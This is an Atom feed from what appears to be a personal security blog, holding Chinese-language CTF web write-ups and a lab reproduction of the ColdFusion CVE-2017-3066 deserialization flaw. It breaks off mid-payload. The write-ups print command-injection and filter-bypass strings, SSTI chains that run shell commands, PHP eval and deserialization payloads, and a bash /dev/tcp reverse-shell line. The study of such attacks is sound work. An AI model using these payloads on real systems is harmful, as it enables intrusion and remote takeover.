<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>be a J0K1R</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-11-22T16:36:08.361Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Peguin</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>祥云杯</title>
    <link href="http://yoursite.com/2020/11/22/%E7%A5%A5%E4%BA%91%E6%9D%AF/"/>
    <id>http://yoursite.com/2020/11/22/%E7%A5%A5%E4%BA%91%E6%9D%AF/</id>
    <published>2020-11-22T15:42:59.000Z</published>
    <updated>2020-11-22T16:36:08.361Z</updated>
    
    <content type="html"><![CDATA[<p>趁着比赛环境还没关，记录一下web题<a id="more"></a></p><h2 id="Command"><a href="#Command" class="headerlink" title="Command"></a>Command</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul><li>命令执行</li><li>常见WAF绕过</li><li>find-linux</li></ul><h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>开题很常见的页面，就是ping，很熟悉了，直接构造命令执行</p><p>过滤了<code>;,空格,cat、tac、more、flag、*等</code>，空格用<code>%09</code>绕过，flag用fla?绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>|ls%<span class="number">09</span>/ <span class="comment">//查看根目录</span></span><br></pre></td></tr></table></figure><img src="/2020/11/22/%E7%A5%A5%E4%BA%91%E6%9D%AF/1.png" class=""><p>根目录下没发现flag，这里用find命令找一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?url=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>|find%<span class="number">09</span>/%<span class="number">09</span>-name%<span class="number">09</span>?????f???</span><br><span class="line"><span class="comment">//这是队里师傅的，我当时比赛试了几个，最后猜测了一下是flag.txt就出来了正确的路径</span></span><br></pre></td></tr></table></figure><img src="/2020/11/22/%E7%A5%A5%E4%BA%91%E6%9D%AF/2.png" class=""><p>最后读取一下就好了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>|ca\t%<span class="number">09</span>/etc/.findf???/f???.txt</span><br></pre></td></tr></table></figure><img src="/2020/11/22/%E7%A5%A5%E4%BA%91%E6%9D%AF/3.png" class=""><h2 id="easygogogo"><a href="#easygogogo" class="headerlink" title="easygogogo"></a>easygogogo</h2><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><ul><li>目录刺穿</li><li>cookie</li></ul><h3 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h3><p>开题就很眼熟，随便账号就能登录，魔改自BJDCTF3的一道题，但是原题的payload不能用</p><p>先上传一个文件，抓包，修改文件名，记录下生成的cookie</p><img src="/2020/11/22/%E7%A5%A5%E4%BA%91%E6%9D%AF/4.png" class=""><p>然后重新下发一个容器，用同样的账号登录，上传一个正常图片，点击show页面时抓包，替换成记录下来的cookie，在访问，发现flag经过base64编码之后的就会出现在图片源码处，解密后拿到flag</p><img src="/2020/11/22/%E7%A5%A5%E4%BA%91%E6%9D%AF/5.png" class=""><h2 id="flaskbot"><a href="#flaskbot" class="headerlink" title="flaskbot"></a>flaskbot</h2><h3 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h3><ul><li>ssti模板注入</li><li>NaN合法数值</li></ul><h3 id="解题过程-2"><a href="#解题过程-2" class="headerlink" title="解题过程"></a>解题过程</h3><p>开题输入<code></code></p><p>发现报错，开启了debug模式，以为要算pin值，但是师傅们都说没有读取文件的利用点</p><p>后面直到看到了</p><img src="/2020/11/22/%E7%A5%A5%E4%BA%91%E6%9D%AF/6.png" class=""><p>注入点应该在cookie，base64加密之后赋值给cookie，但还不够，这样子只是单纯当作了字符串处理，下面这blacknut师傅给的就很关键</p><img src="/2020/11/22/%E7%A5%A5%E4%BA%91%E6%9D%AF/7.png" class=""><p>也就是说payload编码之后传给user写入cookie，然后猜数字也就是num那里填数字，这里就要用到NaN，具体指代合法的数值，这个之前国赛初赛的时候一道题用到过，纯靠队里师傅提醒</p><p>后面的模板要进行字符串拼接，因为有WAF限制</p><p>最终payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__base__.__subclasses__()[<span class="number">131</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'ev'</span>+<span class="string">'al'</span>](<span class="string">'__im'</span>+<span class="string">'port__("o'</span>+<span class="string">'s").po'</span>+<span class="string">'pen("cat /super_secret_fl'</span><span class="string">'ag.txt")'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><img src="/2020/11/22/%E7%A5%A5%E4%BA%91%E6%9D%AF/8.png" class=""><h2 id="easyzzz（简单记录，具体待填坑）"><a href="#easyzzz（简单记录，具体待填坑）" class="headerlink" title="easyzzz（简单记录，具体待填坑）"></a>easyzzz（简单记录，具体待填坑）</h2><p>后台地址/admin539/login.php</p><p>管理员账号密码：admin/fuzzy9inve</p><p>登入后台修改模板中的 index.html 为<code>{if:1234567)echo</code>cat /flag<code>;//}{end if}</code>再返回index.html 即可获得flag</p><img src="/2020/11/22/%E7%A5%A5%E4%BA%91%E6%9D%AF/9.png" class="">]]></content>
    
    <summary type="html">
    
      &lt;p&gt;趁着比赛环境还没关，记录一下web题
    
    </summary>
    
    
    
      <category term="祥云杯" scheme="http://yoursite.com/tags/%E7%A5%A5%E4%BA%91%E6%9D%AF/"/>
    
  </entry>
  
  <entry>
    <title>Adobe-ColdFusion反序列化-CVE-2017-3066</title>
    <link href="http://yoursite.com/2020/11/14/Adobe-ColdFusion%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CVE-2017-3066/"/>
    <id>http://yoursite.com/2020/11/14/Adobe-ColdFusion%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CVE-2017-3066/</id>
    <published>2020-11-14T11:14:45.000Z</published>
    <updated>2020-11-14T12:12:23.056Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Adobe-ColdFusion反序列化命令执行"><a href="#Adobe-ColdFusion反序列化命令执行" class="headerlink" title="Adobe-ColdFusion反序列化命令执行"></a>Adobe-ColdFusion反序列化命令执行<a id="more"></a></h2><h3 id="Adobe-ColdFusion简介"><a href="#Adobe-ColdFusion简介" class="headerlink" title="Adobe ColdFusion简介"></a>Adobe ColdFusion简介</h3><p>Adobe ColdFusion是美国Adobe公司的一款动态Web服务器产品，其运行的CFML（ColdFusion Markup Language）是针对Web应用的一种程序设计语言。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Adobe ColdFusion (2016 release) Update 3及之前的版本，ColdFusion 11 Update 11及之前的版本，ColdFusion 10 Update 22及之前的版本。</p><h3 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;vulhub.org&#x2F;#&#x2F;environments&#x2F;coldfusion&#x2F;CVE-2017-3066&#x2F;</span><br><span class="line">centos</span><br><span class="line">docker-compose up -d</span><br><span class="line">这个镜像拉取的比较大，一个G左右，要等挺长时间的</span><br></pre></td></tr></table></figure><p>docker起来之后访问<code>http://your-ip:8500/CFIDE/administrator/index.cfm</code>，会要求输入密码，驶入<code>vulhub</code>就可以用了</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>生成poc</p><p>下载之后，就可以用给的生成poc来生成了，先试试<code>/tmp</code>目录下创建文件</p><p>windows下有问题，不论怎么试都会说找不到<code>com.codewhitesec.coldfusionpwn.ColdFusionPwner</code>主类</p><img src="/2020/11/14/Adobe-ColdFusion%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CVE-2017-3066/1.png" class=""><p>之后尝试放到了kali下面，结果成功了</p><img src="/2020/11/14/Adobe-ColdFusion%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CVE-2017-3066/2.png" class=""><p>接着访问<code>/flex2gateway/amf</code>,burp抓包，这里要注意的是格式，下图所示</p><img src="/2020/11/14/Adobe-ColdFusion%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CVE-2017-3066/3.png" class=""><p>生成的poc要是复制粘贴会有问题，直接用burp导入poc，然后打过去</p><p>进入docker中看一下</p><img src="/2020/11/14/Adobe-ColdFusion%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CVE-2017-3066/4.png" class=""><p>下面可以尝试反弹shell，还是要用到之前一个生成java反弹shell的网站</p><p>然后再在kali中生成poc文件</p><img src="/2020/11/14/Adobe-ColdFusion%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CVE-2017-3066/5.png" class=""><p>下面的步骤跟上面一样，直接看一下监听的端口有没有反弹</p><img src="/2020/11/14/Adobe-ColdFusion%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CVE-2017-3066/6.png" class=""><p>可以看到成功弹回了shell</p><p>反弹shell格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Adobe-ColdFusion反序列化命令执行&quot;&gt;&lt;a href=&quot;#Adobe-ColdFusion反序列化命令执行&quot; class=&quot;headerlink&quot; title=&quot;Adobe-ColdFusion反序列化命令执行&quot;&gt;&lt;/a&gt;Adobe-ColdFusion反序列化命令执行
    
    </summary>
    
    
    
      <category term="CVE" scheme="http://yoursite.com/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>UNCTF2020</title>
    <link href="http://yoursite.com/2020/11/11/UNCTF2020/"/>
    <id>http://yoursite.com/2020/11/11/UNCTF2020/</id>
    <published>2020-11-11T05:28:54.000Z</published>
    <updated>2020-11-19T14:26:11.498Z</updated>
    
    <content type="html"><![CDATA[<h1 id="UNCTF2020赛题部分WP"><a href="#UNCTF2020赛题部分WP" class="headerlink" title="UNCTF2020赛题部分WP"></a>UNCTF2020赛题部分WP<a id="more"></a></h1><h2 id="easyflask"><a href="#easyflask" class="headerlink" title="easyflask"></a>easyflask</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul><li>flask模板注入</li><li>绕过过滤</li></ul><h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>开题，要求以admin登录，先到/register下注册，/login登录，刷新拿到/secret_route_you_do_not_know，要求用<code>&#39;guess&#39;</code>猜<code>secret</code></p><p>考察的就是python的flask模板注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?guess&#x3D;&#123;&#123;config&#125;&#125;</span><br></pre></td></tr></table></figure><img src="/2020/11/11/UNCTF2020/1.png" class=""><p>经过测试有一下过滤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\&#39;,\&quot;,[],__</span><br></pre></td></tr></table></figure><p>下面用到<code>request.args.xx</code>绕过下划线，或者用<code>request.values.xx</code>利用post传参，但是post不被允许</p><p>下面就是一点点构造payload，下面是最终的exp</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?guess=&#123;&#123;()|attr(request.args.class)|attr(request.args.bases)|attr(request.args.subclasses)()|attr(request.args.a)(117)|attr(request.args.b)|attr(request.args.c)|attr(request.args.d)(request.args.e)(request.args.f)|attr(request.args.g)()&#125;&#125;&amp;class=__class__&amp;bases=__base__&amp;subclasses=__subclasses__&amp;a=__getitem__&amp;b=__init__&amp;c=__globals__&amp;d=get&amp;e=popen&amp;f=cat flag.txt&amp;g=read</span><br></pre></td></tr></table></figure><img src="/2020/11/11/UNCTF2020/2.png" class=""><h2 id="L0vephp"><a href="#L0vephp" class="headerlink" title="L0vephp"></a>L0vephp</h2><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><ul><li>php伪协议</li><li>命令执行绕过长度限制</li></ul><h3 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h3><p>开题，F12源码处发现提示</p><img src="/2020/11/11/UNCTF2020/3.png" class=""><p>加密编码挨个试，发现是base85，在线网站解密</p><img src="/2020/11/11/UNCTF2020/4.png" class=""><p>应该是用GET传参数action，提示了读取源码，用伪协议，base被ban，用string.rot13过滤器，读取index.php和flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$action = $_GET[<span class="string">'action'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($action))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/base|data|input|zip|zlib/i"</span>,$action))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('Hacker!!!')&lt;/script&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"$action"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"footer.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#flag.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"unctf&#123;7his_is_@_f4ke_f1a9&#125;"</span>;</span><br><span class="line"><span class="comment">//hint:316E4433782E706870</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>假的flag，根据提示，16进制转字符串<code>1nD3x.php</code>，访问</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$code=$_REQUEST[<span class="string">'code'</span>];</span><br><span class="line">$_=<span class="keyword">array</span>(<span class="string">'@'</span>,<span class="string">'\~'</span>,<span class="string">'\^'</span>,<span class="string">'\&amp;'</span>,<span class="string">'\?'</span>,<span class="string">'\&lt;'</span>,<span class="string">'\&gt;'</span>,<span class="string">'\*'</span>,<span class="string">'\`'</span>,<span class="string">'\+'</span>,<span class="string">'\-'</span>,<span class="string">'\''</span>,<span class="string">'\"'</span>,<span class="string">'\\\\'</span>,<span class="string">'\/'</span>); </span><br><span class="line">$__=<span class="keyword">array</span>(<span class="string">'eval'</span>,<span class="string">'system'</span>,<span class="string">'exec'</span>,<span class="string">'shell_exec'</span>,<span class="string">'assert'</span>,<span class="string">'passthru'</span>,<span class="string">'array_map'</span>,<span class="string">'ob_start'</span>,<span class="string">'create_function'</span>,<span class="string">'call_user_func'</span>,<span class="string">'call_user_func_array'</span>,<span class="string">'array_filter'</span>,<span class="string">'proc_open'</span>);</span><br><span class="line">$blacklist1 = array_merge($_);</span><br><span class="line">$blacklist2 = array_merge($__);</span><br><span class="line"><span class="keyword">if</span> (strlen($code)&gt;<span class="number">16</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Too long'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> ($blacklist1 <span class="keyword">as</span> $blacklisted) &#123; </span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">'/'</span> . $blacklisted . <span class="string">'/m'</span>, $code)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'WTF???'</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">foreach</span> ($blacklist2 <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">'/'</span> . $blackitem . <span class="string">'/im'</span>, $code)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Sry,try again'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">eval</span>($code);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>长度有限制，黑名单跟不存在没什么区别，直接用，但是构造了挺久发现长度是问题，找到了p神的文章，完美解决</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.leavesongs.com&#x2F;PHP&#x2F;bypass-eval-length-restrict.html</span><br></pre></td></tr></table></figure><p>利用变长参数特性展开数组，详细可以看文章讲解</p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST：code&#x3D;usort(...$_GET);</span><br><span class="line">GET:?1[]&#x3D;test&amp;1[]&#x3D;命令;&amp;2&#x3D;assert</span><br></pre></td></tr></table></figure><img src="/2020/11/11/UNCTF2020/5.png" class=""><h2 id="easy-ssrf"><a href="#easy-ssrf" class="headerlink" title="easy_ssrf"></a>easy_ssrf</h2><h3 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h3><ul><li>路径穿越</li></ul><h3 id="解题过程-2"><a href="#解题过程-2" class="headerlink" title="解题过程"></a>解题过程</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">welc0me to <span class="number">2020</span>UNCTF!!</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span><span class="string">'&lt;center&gt;&lt;strong&gt;welc0me to 2020UNCTF!!&lt;/strong&gt;&lt;/center&gt;'</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/unctf\.com/'</span>,$url))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">'/php|file|zip|bzip|zlib|base|data/i'</span>,$url))&#123;</span><br><span class="line">        $url=file_get_contents($url);</span><br><span class="line">        <span class="keyword">echo</span>($url);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">'error!!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>传入的参数要包含<code>unctf.com</code>，后面过滤了挺多，没想到路径穿越进行文件包含，最近题没咋碰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">?url=unctf.com/../../../../flag</span><br></pre></td></tr></table></figure><h2 id="easyunserialize"><a href="#easyunserialize" class="headerlink" title="easyunserialize"></a>easyunserialize</h2><h3 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h3><ul><li>序列化字符串逃逸</li></ul><h3 id="解题过程-3"><a href="#解题过程-3" class="headerlink" title="解题过程"></a>解题过程</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $uname;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($uname,$password)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;uname=$uname;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;password===<span class="string">'easy'</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">                <span class="keyword">echo</span> $flag;    </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'wrong password'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">'challenge'</span>,<span class="string">'easychallenge'</span>,$string);</span><br><span class="line">&#125;</span><br><span class="line">$uname=$_GET[<span class="number">1</span>];</span><br><span class="line">$password=<span class="number">1</span>;</span><br><span class="line">$ser=filter(serialize(<span class="keyword">new</span> a($uname,$password)));</span><br><span class="line">$test=unserialize($ser);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>一个challenge替换成easychallenge能够逃逸4个字符，要求密码为easy，构造payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;</span><br><span class="line">因为这里只有29个字符，要保持能够正常反序列化，要长度整，最后加3个括号</span><br><span class="line">challengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h2><h3 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h3><ul><li>弱类型比较</li><li>数组序列化</li></ul><h3 id="解题过程-4"><a href="#解题过程-4" class="headerlink" title="解题过程"></a>解题过程</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$username  = <span class="string">"admin"</span>;</span><br><span class="line">$password  = <span class="string">"password"</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">$data = <span class="keyword">isset</span>($_POST[<span class="string">'data'</span>])? $_POST[<span class="string">'data'</span>]: <span class="string">""</span> ;</span><br><span class="line">$data_unserialize = unserialize($data);</span><br><span class="line"><span class="keyword">if</span> ($data_unserialize[<span class="string">'username'</span>]==$username&amp;&amp;$data_unserialize[<span class="string">'password'</span>]==$password)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"username or password error!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$username</code>和<code>$password</code>被flag.php中的覆盖了，用php弱类型比较，bool和任何字符串比较都为true</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">data=a:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">"username"</span>;b:<span class="number">1</span>;s:<span class="number">8</span>:<span class="string">"password"</span>;b:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure><img src="/2020/11/11/UNCTF2020/6.png" class=""><h2 id="babyeval"><a href="#babyeval" class="headerlink" title="babyeval"></a>babyeval</h2><h3 id="知识点-5"><a href="#知识点-5" class="headerlink" title="知识点"></a>知识点</h3><ul><li>不包含括号的命令执行</li><li>过滤器输出</li></ul><h3 id="解题过程-5"><a href="#解题过程-5" class="headerlink" title="解题过程"></a>解题过程</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// flag在flag.php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/\(.*\)/'</span>, $_GET[<span class="string">'a'</span>]))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        ob_start(<span class="function"><span class="keyword">function</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">                 <span class="keyword">if</span> (strpos($data, <span class="string">'flag'</span>) !== <span class="keyword">false</span>)</span><br><span class="line">                 <span class="keyword">return</span> <span class="string">'ByeBye hacker'</span>;</span><br><span class="line">                 <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                 &#125;);</span><br><span class="line">        <span class="keyword">eval</span>($_GET[<span class="string">'a'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>匹配到括号就会退出</p><p>输出不能包含flag</p><p>用过滤器</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">?a=<span class="keyword">include</span> $_GET[<span class="string">'b'</span>];&amp;b=php:<span 